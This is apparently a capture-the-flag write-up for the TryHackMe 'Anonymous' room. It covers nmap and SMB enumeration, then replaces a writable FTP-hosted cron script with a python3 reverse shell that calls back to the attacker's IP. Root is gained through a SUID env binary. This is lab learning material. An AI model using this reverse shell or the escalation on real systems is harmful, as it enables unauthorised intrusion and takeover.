<p align="center">
  THM : Anonymous<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/anonymous<br>
  <img src="https://i.imgur.com/TJZBkQn.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [SMB enumeration](#smb-enumeration)
- [FTP enumeration](#ftp-enumeration)
- [FTP exploitation](#ftp-exploitation)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

First, let's use [nmap](https://nmap.org/) to make an agressive scan on the target machine :  
```
# Nmap 7.80 scan initiated Fri Oct 14 01:49:47 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.170.182
Nmap scan report for 10.10.170.182
Host is up (0.037s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.31.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-10-13T23:50:20+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-13T23:50:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 14 01:50:22 2022 -- 1 IP address (1 host up) scanned in 34.53 seconds
```

- We can enumerate SMB shares and users later
- We know we can connected to the FTP service as anonymous without any password

**Question : Enumerate the machine. How many ports are open ?**  
**Answer : 4**

**Question : What service is running on port 21 ?**  
**Answer : ftp**  

**Question : What service is running on port 139 and 445 ?**  
**Answer : smb**

## SMB enumeration

I will use [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux) to enumerate existing SMB shares and users on the target :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous$ enum4linux 10.10.57.143
WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 14 16:51:19 2022
 =========================================( Target Information )=========================================
Target ........... 10.10.57.143
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ============================( Enumerating Workgroup/Domain on 10.10.57.143 )============================
[+] Got domain/workgroup name: WORKGROUP
 ================================( Nbtstat Information for 10.10.57.143 )================================
Looking up status of 10.10.57.143
	ANONYMOUS       <00> -         B <ACTIVE>  Workstation Service
	ANONYMOUS       <03> -         B <ACTIVE>  Messenger Service
	ANONYMOUS       <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00
 ===================================( Session Check on 10.10.57.143 )===================================
[+] Server 10.10.57.143 allows sessions using username '', password ''
 ================================( Getting domain SID for 10.10.57.143 )================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
 ===================================( OS information on 10.10.57.143 )===================================
[E] Can't get OS info with smbclient
[+] Got OS info for 10.10.57.143 from srvinfo: 
	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =======================================( Users on 10.10.57.143 )=======================================
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 
user:[namelessone] rid:[0x3eb]
 =================================( Share Enumeration on 10.10.57.143 )=================================
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.57.143

//10.10.57.143/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.57.143/pics	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.57.143/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.57.143 )============================
[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/

 =======================================( Groups on 10.10.57.143 )=======================================
[+] Getting builtin groups:
[+]  Getting builtin group memberships:
[+]  Getting local groups:
[+]  Getting local group memberships:
[+]  Getting domain groups:
[+]  Getting domain group memberships:
 ==================( Users on 10.10.57.143 via RID cycling (RIDS: 500-550,1000-1050) )==================
[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''

S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\namelessone (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.57.143 )===============================

No printers returned.


enum4linux complete on Fri Oct 14 16:53:36 2022
```

Now we have a username "namelessone", and a share name "pics" which is readable and writable without any credentials. Let's see what we have in this SMB share :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous$ smbclient //10.10.57.143/pics
Enter WORKGROUP\attacker's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Thu May 14 03:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13306768 blocks available
smb: \> get corgo2.jpg 
getting file \corgo2.jpg of size 42663 as corgo2.jpg (166,7 KiloBytes/sec) (average 166,7 KiloBytes/sec)
smb: \> get puppos.jpeg 
getting file \puppos.jpeg of size 265188 as puppos.jpeg (438,2 KiloBytes/sec) (average 357,5 KiloBytes/sec)
```

I downloaded the two image files on my machine to see if we can find any hidden informations in these files using steghide and stegseek, but I didn't find 
any hidden data in those files.  

**Question : There's a share on the user's computer. What's it called ?**  
**Answer : pics**

## FTP enumeration

So I decided to take a look at the FTP service. We already know that we can connect to the FTP 
service as anonymous without any password. Let's see if we can get any useful files on that FTP service :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous$ ftp 10.10.57.143
Connected to 10.10.57.143.
220 NamelessOne's FTP Server!
Name (10.10.57.143:attacker): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp>
```

There is a scripts directory that is readable and writable. Let's take a look in this directory :  
```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2150 Oct 14 15:08 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```

The first thing that takes my attention is this clean.sh script which is writable. According to 
the name of this script, I think it's used by a cron job or something else that automaticaly 
run this script. Let's first take a look at to_do.txt :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous/ftp$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```

Nothing useful here. Let's take a look at clean.sh :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous/ftp$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

We can see it's a cleanup script that aims to remove temporary files. If this script is really 
running periodically, we can put a reverse shell in it and wait for a connection.

## FTP exploitation

First, let's create our malicious clean.sh script.
```
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.31.20",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

I used [revshells.com](https://www.revshells.com/) to generate a python3 reverse shell.
Now, let's replace the originial clean.sh file with our malicious script using ftp :  
```
ftp> put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
232 bytes sent in 0.00 secs (5.6731 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          232 Oct 14 15:20 clean.sh
-rw-rw-r--    1 1000     1000         2666 Oct 14 15:20 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```

We can now set up a netcat listener on port 4242 and wait for a connection :  
```
attacker@AttackBox:~/Documents/THM/CTF/Anonymous$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.31.20] from (UNKNOWN) [10.10.57.143] 42090
$ whoami
whoami
namelessone
$
```

And we have a shell as namelessone ! Let's stabilise our shell :
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
namelessone@anonymous:~$ export TERM=xterm
export TERM=xterm
namelessone@anonymous:~$
```

And to fully stabilise the shell, I put it in background using CTRL+Z and then I use `stty -echo raw;fg`.
Let's see what files are in the current directory :  
```
namelessone@anonymous:~$ ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt 
**************************************
```

And we have the user flag !

**Question : user.txt**  
**Answer : HIDDEN**

## Privilege escalation

Now we have to elevate our privileges.
I used the famous tool named [linPEAS.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to enumerate the machine for privilege escalation. 
LinPEAS found an interesting binary that has the SUID bit set named "env". When looking for this binary 
on [GTFOBins](https://gtfobins.github.io/), we see that it is possible to execute another binary using env without dropping 
the privileges, so we can spawn a shell as root :  
![](https://i.imgur.com/OGdiQPH.jpg)

Let's try this :  
```
namelessone@anonymous:/tmp$ env /bin/bash -p
bash-4.4# whoami
root
```

And we have a root shell ! Let's get the final flag :  
```
bash-4.4# ls -la
total 60
drwx------  6 root root  4096 May 17  2020 .
drwxr-xr-x 24 root root  4096 May 12  2020 ..
lrwxrwxrwx  1 root root     9 May 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 11  2020 .cache
drwx------  3 root root  4096 May 11  2020 .gnupg
drwxr-xr-x  3 root root  4096 May 11  2020 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    33 May 11  2020 root.txt
-rw-r--r--  1 root root    66 May 11  2020 .selected_editor
drwx------  2 root root  4096 May 11  2020 .ssh
-rw-------  1 root root 13795 May 17  2020 .viminfo
-rw-------  1 root root    55 May 14  2020 .Xauthority
bash-4.4# cat root.txt 
***********************************
```

**Question : root.txt**  
**Answer : HIDDEN**

## Conclusion

This room was very cool. I learned a new way to gain a shell on a machine when FTP is not 
properly configured and using scripts that run periodically. Thanks for this room ! And thanks for reading my write ups !
